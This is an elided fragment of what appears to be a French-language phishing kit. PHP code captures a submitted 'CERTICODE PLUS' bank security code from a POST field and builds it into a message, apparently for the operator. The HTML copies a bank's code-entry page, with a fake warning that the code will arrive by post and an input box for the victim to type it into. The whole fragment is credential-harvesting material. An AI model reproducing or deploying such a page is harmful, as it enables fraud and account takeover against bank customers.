...
if (strlen($_POST['id']) > 5 ) {
   ...
   $message = 'CODE CERTICODE 1   :' .$_POST['id'] ."\r\n";
  ...
  <div class="tel">
    ...
    <div class="row">
      ...
      <div class="col-6 row" style="background:white">
        <div class="col-11 ">
                 <p style="color: red;" >⚠️ <br>Si vous n'avez reçu le code CERTICODE PLUS, vous le recevrez prochainement par courrier postale à votre adresse de domicile </p>
...
<hr align="center" width="100%" color="#1346A0" size="5">
          ...
          <p style="left:-200px">Veuillez saisir le code de sécurité reçu par courrier (Exemple: FHJO3N)</p>     
            <div class="form-group col-9 row" style="left:-25px">        
              <b class="col-7" for="id" style="text-align: right;">CERTICODE PLUS:</b>
              <input type="tel" class="form-control ordi col-5" id="id" name="id" maxlength="8" style=" margin-bottom: 15%;  background-image: url(cap/CerticodeAvec.png); background-repeat: no-repeat;
